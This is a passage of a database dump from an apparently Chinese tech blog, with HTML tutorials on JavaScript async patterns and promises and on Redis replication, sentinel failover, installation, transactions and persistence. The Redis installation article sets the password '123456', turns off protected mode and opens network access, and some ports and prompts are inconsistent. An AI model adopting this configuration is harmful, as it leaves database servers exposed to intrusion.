{\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;async(4,function(value) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;async(5,function(value) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;async(6,final);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;});\n&nbsp;&nbsp;&nbsp;});\n&nbsp;});\n});\n</pre><h3>串行执行</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*串行执行*/\nfunction async(args, callback){\n&nbsp;&nbsp;console.log(\"参数为\"+args+\" 1秒后返回\");\n&nbsp;&nbsp;setTimeout(function(){callback(args*2);},1000);\n}\nfunction final(value){\n&nbsp;&nbsp;console.log(\"完成 \", value);\n}\nlet items = [1,2,3,4,5,6];\nlet results = [];\nfunction series(item) {\n&nbsp;&nbsp;if(item){\n&nbsp;&nbsp;&nbsp;&nbsp;async(item,function(result){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results.push(result);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return series(items.shift());\n&nbsp;&nbsp;&nbsp;});\n&nbsp;}else{\n&nbsp;&nbsp;&nbsp;&nbsp;return final(results[results.length-1]);\n&nbsp;}\n}\nseries(items.shift());\n</pre><h3>并行执行</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*并行执行*/\n/*所有异步函数同时执行, 耗时少, 但是占用系统资源, 6s的用时缩短至1s*/\nfunction async(args, callback){\n&nbsp;&nbsp;console.log(\"参数为\"+args+\" 1秒后返回\");\n&nbsp;&nbsp;setTimeout(function(){callback(args*2);},1000);\n}\nfunction final(value){\n&nbsp;&nbsp;console.log(\"完成 \",value);\n}\nlet items = [1,2,3,4,5,6];\nlet results = [];\nitems.forEach(function (item) {\n&nbsp;&nbsp;async(item,function (result) {\n&nbsp;&nbsp;&nbsp;&nbsp;results.push(result);\n&nbsp;&nbsp;&nbsp;&nbsp;if(results.length === items.length){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final(results[results.length-1]);\n&nbsp;&nbsp;&nbsp;}\n&nbsp;})\n});\n</pre><h3>并行与串行的结合</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*并行与串行的结合*/\n/*下面代码最多运行2个异步任务, 达到了资源与效率的最佳平衡*/\nfunction async(args, callback){\n&nbsp;&nbsp;console.log(\"参数为\"+args+\" 1秒后返回\");\n&nbsp;&nbsp;setTimeout(function(){callback(args*2);},1000);\n}\nfunction final(value){\n&nbsp;&nbsp;console.log(\"完成 \",value);\n}\nlet limit = 2;\nlet running = 0;\nlet items = [1,2,3,4,5,6];\nlet results = [];\nfunction launcher(){\n&nbsp;&nbsp;while(running &lt; limit&amp;&amp;items.length &gt; 0){\n&nbsp;&nbsp;&nbsp;&nbsp;let item = items.shift();\n&nbsp;&nbsp;&nbsp;&nbsp;async(item, function(result){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;results.push(result);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;running--;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(items.length &gt; 0){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;launcher();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else if(running === 0){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final(results[results.length-1]);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;});\n&nbsp;&nbsp;&nbsp;&nbsp;running++;\n&nbsp;}\n}\nlauncher();\n</pre><h2>定时器</h2><pre class=\"ql-syntax\" spellcheck=\"false\">setTimeout()函数的第一个参数是所要推迟执行的函数或一段代码 注意这里的一段代码要以字符串的形式出现\n第二个参数是推迟指行的毫秒数\n还可以接受更多的参数 作为回调函数的参数\n如果回调函数是对象的方法,那么此时方法中的this不再指向对象所在的环境,而是指向的全局环境\n而如果非要指向对象环境,使用bind方法绑定即可\nsetInterval()用法和setTimeout()完全一致,只是前者会每隔一段时间就执行,也就是无限次的运行\nclearInterval()和clearTimeout() 取消对象的定时器\n</pre><h3>setTimeout()</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*用户在每次输入文本后,会立刻将字符转换为大写*/\ndocument.getElementById(\"input-box\").onkeypress=function(){\n&nbsp;&nbsp;let that = this;\n&nbsp;&nbsp;setTimeout(() =&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;that.value = that.value.toUpperCase();\n&nbsp;&nbsp;&nbsp;&nbsp;console.log(that.value);&nbsp;\n&nbsp;},0);\n}&nbsp;\n/*改变网页元素的背景颜色*/\nlet div = document.getElementsByTagName(\'div\')[0];\nlet timer;\nlet i = 0x000000;\nfunction func() {\n&nbsp;&nbsp;timer = setTimeout(func, 0);\n&nbsp;&nbsp;div.style.backgroundColor = \'#\' + i.toString(16);\n&nbsp;&nbsp;if (i++ === 0xFFFFFF) clearTimeout(timer);\n}\ntimer = setTimeout(func, 0);\n</pre><h3>sleep() 函数</h3><pre class=\"ql-syntax\" spellcheck=\"false\">function sleep(ms){\n&nbsp;&nbsp;let start = Date.now();\n&nbsp;&nbsp;while((Date.now() - start) &lt; ms){}\n}\n</pre><h2>promise</h2><pre class=\"ql-syntax\" spellcheck=\"false\">Promise对象通过自身的状态来控制异步操作,Promise实例共有3种状态\n 1: pending&nbsp;&nbsp;异步操作未完成 \n 2: fulfilled&nbsp;异步操作成功\n 3: rejected&nbsp;异步操作失败\n (fulfilled和rejected统称为resolved(已定型,该状态已不能再发生改变))\nlet promise = new Promise(function(resolved,rejected){\n&nbsp;&nbsp;if(\"异步操作成功\"){\n&nbsp;&nbsp;&nbsp;&nbsp;resolved(value);\n&nbsp;}else if(\"异步操作失败\"){\n&nbsp;&nbsp;&nbsp;&nbsp;rejected(new Error());\n&nbsp;}\n});\n/*返回一个实例,5秒后该实例的状态会变为fulfilled*/\nfunction timeout(ms){\n&nbsp;&nbsp;return new Promise((resolve,reject)=&gt;{\n&nbsp;&nbsp;&nbsp;&nbsp;setTimeout(resolve,ms,\'done\');\n&nbsp;});\n}\nconsole.log(timeout(5000));\nlet promise = new Promise(function(resolve,reject){\n&nbsp;&nbsp;resolve(\'done!\');\n});\npromise.then(console.log); //done!\n</pre><p><br></p>',6,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDXxKAcbNiAAA3qGIYdqA63.jpeg',2,0,'220226DP09K1F0SW','PromisePromise任务队列和事件循环异步操作的基本流程控制嵌套回调串行执行并行执行并行与串行的结合定时器setTimeout()sleep()函数promise任务队列和事件循环首先js只在一个线程上运行(主线程),但不代表js只有一个线程,而js引擎有多个线程,其他线程都是在后台配合;js内部采用事件循环机制(EventLoop);js在运行时除了一个正在运行的主线程,js引擎还提供了',0,0,0,NULL,0,0,'2022-05-17 16:39:11','2022-05-17 16:39:11','[\"220517BWRZ2XPFA8\"]',NULL),('220517BX5R4GY8ZC','redis主从复制','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">Replication</span></p><p><span style=\"color: rgb(65, 131, 196);\">一主二仆</span></p><p><span style=\"color: rgb(65, 131, 196);\">薪火相传</span></p><p><span style=\"color: rgb(65, 131, 196);\">反客为主</span></p><p><span style=\"color: rgb(65, 131, 196);\">哨兵模式(sentinel)</span></p><h2>Replication</h2><p>主从复制</p><p>配置从库不用配置主库</p><h3>一主二仆</h3><pre class=\"ql-syntax\" spellcheck=\"false\"># 从库配置\nslaveof 主库IP 主库端口\n# 取消从库配置,使当前数据库停止与其他数据库的同步,转化为主数据库\nslaveof no one\n# 主库\n127.0.0.1: 6379&gt; info replication&nbsp;\n# Replication\nrole: master\nconnected_slaves: 0\nmaster_replid: 7f39ff900c939bf7795372bf8160ff31aa0fd26e\nmaster_replid2: f97aced19f0231382f5c223b557c22d6a12d5e70\nmaster_repl_offset: 0\nsecond_repl_offset: 1\nrepl_backlog_active: 0\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 0\nrepl_backlog_histlen: 0\n# 从库一\n[root@centos bin]# ./redis-server ./6380.conf\n[root@centos bin]# ./redis-cli -p 6380\n# 查看从库的信息\n127.0.0.1: 6380&gt; info replication\n# Replication\nrole: master\nconnected_slaves: 0\nmaster_replid: 6bd8662e4fec3c530d4f5c2ecc9d4110b9da90a9\nmaster_replid2: 0000000000000000000000000000000000000000\nmaster_repl_offset: 0\nsecond_repl_offset: -1\nrepl_backlog_active: 0\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 0\nrepl_backlog_histlen: 0\n# 从库配置一\n127.0.0.1: 6380&gt; slaveof 127.0.0.1 6379\nOK\n# 再次查看从库信息\n127.0.0.1: 6380&gt; info replication\n# Replication\nrole: slave\nmaster_host: 127.0.0.1\nmaster_port: 6379\nmaster_link_status: up\nmaster_last_io_seconds_ago: 6\nmaster_sync_in_progress: 0\nslave_repl_offset: 1608\nslave_priority: 100\nslave_read_only: 1\nconnected_slaves: 0\nmaster_replid: 0a026d10eda541c2cb2e00b21099ad5a830881d2\nmaster_replid2: 0000000000000000000000000000000000000000\nmaster_repl_offset: 1608\nsecond_repl_offset: -1\nrepl_backlog_active: 1\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 1\nrepl_backlog_histlen: 1608\n# 从库二\n[root@centos bin]# ./redis-server ./6381.conf\n[root@centos bin]# ./redis-cli\n# 配置从库二\n127.0.0.1: 6379&gt; slaveof 127.0.0.1 6379\nOK Already connected to specified master\n# 再次查看从库信息&nbsp;&nbsp;\n127.0.0.1: 6381&gt; info replication\n# Replication\nrole: slave\nmaster_host: 127.0.0.1\nmaster_port: 6379\nmaster_link_status: up\nmaster_last_io_seconds_ago: 6\nmaster_sync_in_progress: 0\nslave_repl_offset: 1790\nslave_priority: 100\nslave_read_only: 1\nconnected_slaves: 0\nmaster_replid: 0a026d10eda541c2cb2e00b21099ad5a830881d2\nmaster_replid2: 0000000000000000000000000000000000000000\nmaster_repl_offset: 1790\nsecond_repl_offset: -1\nrepl_backlog_active: 1\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 29\nrepl_backlog_histlen: 1762\n# 再次查看主库信息\n127.0.0.1: 6379&gt; info replication\n# Replication\nrole: master\nconnected_slaves: 2\nslave0: ip=127.0.0.1,port=6380,state=online,offset=417,lag=1 # 从库一\nslave1: ip=127.0.0.1,port=6381,state=online,offset=417,lag=1 # 从库二\nmaster_replid: 0a026d10eda541c2cb2e00b21099ad5a830881d2\nmaster_replid2: 0000000000000000000000000000000000000000\nmaster_repl_offset: 417\nsecond_repl_offset: -1\nrepl_backlog_active: 1\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 1\nrepl_backlog_histlen: 417\n</pre><p>主库可读也可写(主要写数据),但是从库只可以读数据</p><pre class=\"ql-syntax\" spellcheck=\"false\">127.0.0.1: 6381&gt; set k1 v1\n(error) READONLY You can\'t write against a read only replica.\n</pre><p>从库会备份主库所有的数据(并不是只备份配置从库之后时间段的数据)</p><p>当主库掉线时(使用shutdown命令,在使用exit命令  直接使用exit命令不行),并不会消除和从库的关系,当主库重新上线时依然是之前从库的主库</p><p>当从库掉线时,会消除和主库的关系以及之前所有备份的数据(注意备份文件dump.rdb和aof的影响),即当从库重新上线时为master,需要手动重新配置从库,而且此时会复制主库之前所有的数据</p><pre class=\"ql-syntax\" spellcheck=\"false\">slaveof 127.0.0.1 6379\n</pre><h3>薪火相传</h3><p>从库既可以作为上一个主库的从库,也可以作为下一个从库的主库</p><pre class=\"ql-syntax\" spellcheck=\"false\"># 主库\n127.0.0.1: 6379&gt;\n# 6379的从库 6381的主库\n127.0.0.1: 6380&gt; slaveof 127.0.0.1 6379\n# 6380的从库\n127.0.0.1: 6381&gt; slaveof 127.0.0.1 6380\n</pre><h3>反客为主</h3><pre class=\"ql-syntax\" spellcheck=\"false\"># 当主库下线时\n127.0.0.1: 6379&gt; shutdown\n# 成为主库\n127.0.0.1: 6380&gt; slaveof no one \n# 6380的从库\n127.0.0.1: 6381&gt; slaveof 127.0.0.1 6380\n</pre><p>总结: 当slaveof启动成功连接到master后会发送一个sync命令,master在接收到命令后会启动后台的存盘进程,同时收集所有接收到用于修改数据集的命令,在后台进程执行完毕之后,master将传送整个数据文件到slave,已完成一次完全同步</p><p>全量复制: 在slave服务接收到数据库文件之后,将其存盘并加载到内存中</p><p>增量复制: master继续将新的所有收集到的命令一次传给slave完成同步</p><p>只要重新连接master,一次完全同步(增量复制)将被自动执行</p><h2>哨兵模式(sentinel)</h2><p>新建sentinel.conf文件</p><p>sentinel monitor 被监控数据库的名字 监控主机的ip 票数(最终票数大于票数的数据库成为主库)</p><pre class=\"ql-syntax\" spellcheck=\"false\"># 启动哨兵模式\n./redis-sentinel ./sentinel.conf\n3600: X 17 Jul 2020 13: 57: 16.215 # Sentinel ID is 0d755d0aeb17d57bdcfac3e5990575f4986e222e\n3600: X 17 Jul 2020 13: 57: 16.215 # +monitor master post6379 127.0.0.1 6379 quorum 1\n3600: X 17 Jul 2020 13: 57: 16.217 * +slave slave 127.0.0.1: 6381 127.0.0.1 6381 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 13: 57: 16.219 * +slave slave 127.0.0.1: 6380 127.0.0.1 6380 @ post6379 127.0.0.1 6379\n# 主库下线\n127.0.0.1: 6379&gt; SHUTDOWN\nnot connected&gt; exit\n3600: X 17 Jul 2020 14: 00: 14.585 # +sdown master post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.585 # +odown master post6379 127.0.0.1 6379 #quorum 1/1\n3600: X 17 Jul 2020 14: 00: 14.585 # +new-epoch 1\n3600: X 17 Jul 2020 14: 00: 14.585 # +try-failover master post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.586 # +vote-for-leader 0d755d0aeb17d57bdcfac3e5990575f4986e222e 1\n3600: X 17 Jul 2020 14: 00: 14.586 # +elected-leader master post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.586 # +failover-state-select-slave master post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.662 # +selected-slave slave 127.0.0.1: 6381 127.0.0.1 6381 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.662 * +failover-state-send-slaveof-noone slave 127.0.0.1: 6381 127.0.0.1 6381 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.729 * +failover-state-wait-promotion slave 127.0.0.1: 6381 127.0.0.1 6381 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.915 # +promoted-slave slave 127.0.0.1: 6381 127.0.0.1 6381 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.915 # +failover-state-reconf-slaves master post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 14.965 * +slave-reconf-sent slave 127.0.0.1: 6380 127.0.0.1 6380 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 15.936 * +slave-reconf-inprog slave 127.0.0.1: 6380 127.0.0.1 6380 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 15.936 * +slave-reconf-done slave 127.0.0.1: 6380 127.0.0.1 6380 @ post6379 127.0.0.1 6379\n3600: X 17 Jul 2020 14: 00: 15.990 # +failover-end master post6379 127.0.0.1 6379\n# 选举6381为主库\n3600: X 17 Jul 2020 14: 00: 15.990 # +switch-master post6379 127.0.0.1 6379 127.0.0.1 6381\n3600: X 17 Jul 2020 14: 00: 15.991 * +slave slave 127.0.0.1: 6380 127.0.0.1 6380 @ post6379 127.0.0.1 6381\n3600: X 17 Jul 2020 14: 00: 15.991 * +slave slave 127.0.0.1: 6379 127.0.0.1 6379 @ post6379 127.0.0.1 6381\n3600: X 17 Jul 2020 14: 00: 46.001 # +sdown slave 127.0.0.1: 6379 127.0.0.1 6379 @ post6379 127.0.0.1 6381\n​\n# 主库变成从库\n127.0.0.1: 6379&gt; info replication\n# Replication\nrole: slave\nmaster_host: 127.0.0.1\nmaster_port: 6380\nmaster_link_status: up\nmaster_last_io_seconds_ago: 0\nmaster_sync_in_progress: 0\nslave_repl_offset: 28439\nslave_priority: 100\nslave_read_only: 1\nconnected_slaves: 0\nmaster_replid: 57f61dc1ed803e1b709eed6eaf5f10935786c059\nmaster_replid2: 0000000000000000000000000000000000000000\nmaster_repl_offset: 28439\nsecond_repl_offset: -1\nrepl_backlog_active: 1\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 26779\nrepl_backlog_histlen: 1661\n# 从库变成主库\n127.0.0.1: 6380&gt; info replication\n# Replication\nrole: master\nconnected_slaves: 2\nslave0: ip=127.0.0.1,port=6381,state=online,offset=65784,lag=1\nslave1: ip=127.0.0.1,port=6379,state=online,offset=65784,lag=1\nmaster_replid: 57f61dc1ed803e1b709eed6eaf5f10935786c059\nmaster_replid2: e64c672ae3237d6d05788b4781de8007d6f65b5d\nmaster_repl_offset: 65784\nsecond_repl_offset: 20617\nrepl_backlog_active: 1\nrepl_backlog_size: 1048576\nrepl_backlog_first_byte_offset: 1\nrepl_backlog_histlen: 65784\n</pre><p>同一组sentinel可以同时监控多个master</p><p>复制的缺点: 由于所有的写操作都是在master上,然后同步更新到slave上,所以从master到slave会有一定的延迟,当slave很多时,会使延迟加重</p><p><br></p>',2,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDX3CACKfNAABT4pKUSFQ17.jpeg',2,0,'220226DP09K1F0SW','目录目录Replication一主二仆薪火相传反客为主哨兵模式(sentinel)Replication主从复制配置从库不用配置主库一主二仆#从库配置 slaveof主库IP主库端口 #取消从库配置,使当前数据库停止与其他数据库的同步,转化为主数据库 slaveofnoone #主库 127.0.0.1:6379&gt;inforeplication&nbsp; #Replication role',0,0,0,NULL,0,0,'2022-05-17 16:40:27','2022-05-17 16:40:27','[\"220329D4CRPCTPSW\",\"220329D180W7F2RP\",\"220329D4G2NW2TMW\"]',NULL),('220517BXCSX0446W','redis 安装','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">redis安装</span></p><p><span style=\"color: rgb(65, 131, 196);\">升级gcc</span></p><p><span style=\"color: rgb(65, 131, 196);\">图形化界面连接redis</span></p><p><span style=\"color: rgb(65, 131, 196);\">修改redis.conf配置文件</span></p><p><span style=\"color: rgb(65, 131, 196);\">开放3306端口</span></p><p><span style=\"color: rgb(65, 131, 196);\">重启redis</span></p><h2>redis安装</h2><p>下载redis <a href=\"http://www.redis.io\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(65, 131, 196);\">redis官网</a>  /opt目录下解压</p><pre class=\"ql-syntax\" spellcheck=\"false\">tar -zxvf redis-6.0.5.tar.gz\n</pre><p>进入redis-6.0.5目录中执行<code style=\"background-color: rgb(243, 244, 244);\">make</code>命令进行编译, 然后再执行<code style=\"background-color: rgb(243, 244, 244);\">make install</code> 命令安装(默认安装在/usr/local/bin目录下)</p><p>注意在使用<code style=\"background-color: rgb(243, 244, 244);\">make</code>命令进行编译时可能会报错,gcc老版本不兼容redis6.0以上的版本(升级gcc即可) 查看gcc的版本 <code style=\"background-color: rgb(243, 244, 244);\">gcc -v</code></p><h3>升级gcc</h3><p>CentOS7默认gcc版本4.8.5</p><pre class=\"ql-syntax\" spellcheck=\"false\">yum install centos-release-scl\nyum install devtoolset-7 -y\n</pre><p>设置devtoolset-7 为默认的gcc编译器</p><pre class=\"ql-syntax\" spellcheck=\"false\"># 临时切换系统的gcc版本\nscl enable devtoolset-7 bash\n# 永久切换系统的gcc版本\necho \"source /opt/rh/devtoolset-7/enable\" &gt;&gt;/etc/profile\n# 让配置生效\nsource /etc/profile\n</pre><p>在redis-6.0.5目录下更改redis.conf配置文件,找到general下的deamonize,将<code style=\"background-color: rgb(243, 244, 244);\">no</code>修改为<code style=\"background-color: rgb(243, 244, 244);\">yes</code>(以后台方式运行),保存退出</p><pre class=\"ql-syntax\" spellcheck=\"false\"># redis.conf\n# redis密码\nrequirepass 123456\n# 以配置文件方式启动\ncd src\n./redis-server ../redis.conf\n./redis-cli -p 6379\nping\n# (error) NOAUTH Authentication required.\n# 密码认证即可\nauth 123456\nping\nPONG\n</pre><h2>图形化界面连接redis</h2><h3>修改redis.conf配置文件</h3><pre class=\"ql-syntax\" spellcheck=\"false\"># 注释掉redis与本地服务器的绑定关系\nbind 127.0.0.1\n# 关闭受保护模式\nprotected-mode no\n</pre><h3>开放3306端口</h3><pre class=\"ql-syntax\" spellcheck=\"false\"># 测试window是否可以连通Linux中redis端口\ntelnet 192.168.1.105 6379\n# 若是云服务器设置安全组开放3306\nfirewall-cmd --zone=public --add-port=3306/tcp --permanent;\nsystemctl restart firewalld;\nfirewall-cmd --reload\n</pre><h3>重启redis</h3><p><br></p>',2,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDX5mAMNeiAACDmnRA4kU24.jpeg',2,0,'220226DP09K1F0SW','目录目录redis安装升级gcc图形化界面连接redis修改redis.conf配置文件开放3306端口重启redisredis安装下载redisredis官网/opt目录下解压tar-zxvfredis-6.0.5.tar.gz 进入redis-6.0.5目录中执行make命令进行编译,然后再执行makeinstall命令安装(默认安装在/usr/local/bin目录下)注意在使用make命令',0,0,0,NULL,0,0,'2022-05-17 16:41:12','2022-05-17 16:41:12','[\"220329D4CRPCTPSW\",\"220329D180W7F2RP\"]',NULL),('220517BXS3RXC1YW','reids 事务','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">Transaction</span></p><p><span style=\"color: rgb(65, 131, 196);\">悲观锁</span></p><p><span style=\"color: rgb(65, 131, 196);\">乐观锁</span></p><p><span style=\"color: rgb(65, 131, 196);\">消息订阅发布（了解）</span></p><h2>Transaction</h2><p>一个队列中 一次性,顺序性,排他性地执行一系列命令</p><pre class=\"ql-syntax\" spellcheck=\"false\">MULTI&nbsp;# 开始事务\n127.0.0.1:6379&gt; MULTI\nOK\n127.0.0.1:6379&gt; set balance 100\nQUEUED\n127.0.0.1:6379&gt; set debt 0\nQUEUED\n127.0.0.1:6379&gt; \n</pre><p>将多个命令入队到事务中,接下来这些命令并不会立即执行,而是放到等待执行的事务队列中</p><pre class=\"ql-syntax\" spellcheck=\"false\">EXEC&nbsp;&nbsp;# 提交事务\nDISCARD # 取消事务\n</pre><p>单独的隔离操作: 事务中的所有命令都会序列化,按顺序地执行,事务在执行过程中不会被其他客户端发来的命令所打断</p><p>没有隔离级别的概念: 队列中的命令在没有提交之前都不会被实际地执行,因为在事务没有提交之前任何的指令都不会实际地执行</p><p>不能保证原子性: redis中同一事务中如果有一条命令执行失败则其后的命令仍然会被执行,没有回滚</p><p><br></p><p><br></p><p>redis对事务是部分支持的,如果在一次事务中如果一条命令在加入队列之前发生错误,就不会加入队列中,那么其他正常加入队列的命令都会执行失败。而在一次事务中,如果一条命令在加入队列之后执行失败,则除了该命令其他加入队列后正常执行的命令都会执行成功</p><pre class=\"ql-syntax\" spellcheck=\"false\"> # 监视一个或多个key,如果在事务提交之前这个或这些key被其他命令所改动,那么事务将被打断并返回nil\nwatch\n# 取消对所有key的监视\nunwatch\n</pre><p>一旦执行<code style=\"background-color: rgb(243, 244, 244);\">EXEC</code>命令,之前所加的监控锁都会被取消掉</p><h3>悲观锁</h3><h3>乐观锁</h3><h2>消息订阅发布（了解）</h2><p>进程间的一种通信模式 </p><p>发送者（pub）发送消息 订阅者（sub）接受消息</p><p>先订阅后发布才能收到消息</p><pre class=\"ql-syntax\" spellcheck=\"false\"># 订阅多个\nSUBSCRIBE a b c\n# 发布消息\nPUBLISH a hello\n# 订阅多个(*通配符)\nPSUBSCRIBE a*\n#发布消息\nPUBLISH a1 hello\nPUBLISH a2 HelloRedis\n</pre><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDX9eAc405AAVi9LpTKr891.jpeg',2,0,'220226DP09K1F0SW','目录目录Transaction悲观锁乐观锁消息订阅发布（了解）Transaction一个队列中一次性,顺序性,排他性地执行一系列命令MULTI&nbsp;#开始事务 127.0.0.1:6379&gt;MULTI OK 127.0.0.1:6379&gt;setbalance100 QUEUED 127.0.0.1:6379&gt;setdebt0 QUEUED 127.0.0.1:6379&gt',0,0,0,NULL,0,0,'2022-05-17 16:42:12','2022-05-17 16:42:12','[\"220329D180W7F2RP\",\"220329D4CRPCTPSW\",\"220329D4G2NW2TMW\"]',NULL),('220517BY1PM0TZ9P','redis 持久化','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">redis persistence</span></p><p><span style=\"color: rgb(65, 131, 196);\">RDB(Redis Database)</span></p><p><span style=\"color: rgb(65, 131, 196);\">SNAPSHOTTING快照</span></p><p><span style=\"color: rgb(65, 131, 196);\">AOF(Append Only File)</span></p><p><span style=\"color: rgb(65, 131, 196);\">APPEND ONLY MODE</span></p><h2>redis persistence</h2><p>Redis 的持久化主要有两大机制, 即 AOF (Append Only File) 日志和 RDB 快照</p><h3>RDB(Redis Database)</h3><p>内存快照, 就是指内存中的数据在某一个时刻的状态记录</p><p>在指定的时间间隔内将内存中的数据集快照写入磁盘, 即快照; 数据恢复时直接将快照文件读入内存中</p><p>给哪些内存数据做快照?</p><p>为了提供所有数据的可靠性保证, 它执行的是全量快照</p><p>Redis 提供了两个命令来生成 RDB 文件, 分别是 save 和 bgsave</p><ul><li>save: 在主线程中执行, 会导致阻塞</li><li>bgsave: 创建一个子进程, 专门用于写入 RDB 文件, 避免了主线程的阻塞, 这也是 Redis RDB 文件生成的默认配置</li></ul><p>快照时数据能修改吗?</p><p>为了保证快照完整性, 主线程只能处理读操作, 因为不能修改正在执行快照的数据, 为了保证Redis 的性能 Redis 就会借助操作系统提供的写时复制技术(Copy-On-Write, COW), 在执行快照的同时, 正常处理写操作 bgsave 子进程是由主线程 fork 生成的, 可以共享主线程的所有内存数据; bgsave 子进程运行后, 开始读取主线程的内存数据, 并把它们写入 RDB 文件</p><p>虽然 bgsave 执行时不阻塞主线程, 但是, 如果频繁地执行全量快照, 也会带来两方面的开销</p><ul><li>频繁将全量数据写入磁盘, 会给磁盘带来很大压力, 多个快照竞争有限的磁盘带宽, 前一个快照还没有做完, 后一个又开始做了, 容易造成恶性循环</li><li>bgsave 子进程需要通过 fork 操作从主线程创建出来; 虽然, 子进程在创建后不会再阻塞主线程, 但是, fork 这个创建过程本身会阻塞主线程, 而且主线程的内存越大, 阻塞时间越长; 如果频繁 fork 出 bgsave 子进程, 这就会频繁阻塞主线程了(所以, 在 Redis 中如果有一个 bgsave 在运行, 就不会再启动第二个 bgsave 子进程)</li></ul><p>解决: 增量快照, 就是指, 做了一次全量快照后, 后续的快照只对修改的数据进行快照记录, 这样可以避免每次全量快照的开销</p><p>比较AOF: 虽然跟 AOF 相比, 快照的恢复速度快(只需要把 RDB 文件直接读入内存, 这就避免了 AOF 需要顺序、逐一重新执行操作命令带来的低效性能问题), 但是, 快照的频率不好把握, 如果频率太低, 两次快照间一旦宕机, 就可能有比较多的数据丢失, 如果频率太高, 又会产生额外开销</p><p>混合使用 AOF 日志和内存快照: 内存快照以一定的频率执行, 在两次快照之间, 使用 AOF 日志记录这期间的所有命令操作</p><p>在两次快照之间进行的数据修改操作, 用 AOF 日志记录, 等到第二次做全量快照时, 就可以清空 AOF 日志, 因为此时的修改都已经记录到快照中了, 恢复时就不再用日志了</p><h4>SNAPSHOTTING快照</h4><pre class=\"ql-syntax\" spellcheck=\"false\">dbfilename dump.rdb&nbsp;# 默认持久化到dump.rdb文件中 \nsave 900 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 15分钟内保存一次即修改一次\nsave 300 10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 5分钟内保存十次即修改十次\nsave 60 10000&nbsp;&nbsp;&nbsp;&nbsp;# 1分钟内保存一万次即修改一万次\nstop-writes-on-bgsave-error yes&nbsp;# 保存出错停止写入\nrdbcompression yes&nbsp;&nbsp;# 数据压缩\nrdbchecksum yes&nbsp;&nbsp;&nbsp;# 数据校验\ndir ./&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\nconfig get dir&nbsp;&nbsp;&nbsp;&nbsp;# 获取redis启动路径\nsave&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 手动备份\n</pre><p>RDB适合大规模的数据恢复, 而且对数据的完整性和一致性要求不高</p><h3>AOF(Append Only File)</h3><p>数据库的写前日志(Write Ahead Log, WAL), 也就是说, 在实际写数据前, 先把修改的数据记到日志文件中(redo log和binlog是在commit之前写的日志), </p><p>以便故障时进行恢复; 不过, AOF 日志正好相反, 它是写后日志, \"写后\"的意思是 Redis 是先执行命令, 把数据写入内存, 然后才记录日志</p><p>传统数据库的日志, 例如 redo log(重做日志), 记录的是修改后的数据, 而 AOF 里记录的是 Redis 收到的每一条命令, 这些命令是以文本形式保存</p><p>AOF 为什么要先执行命令再记日志?</p><p>为了避免额外的检查开销, Redis 在向 AOF 里面记录日志的时候, 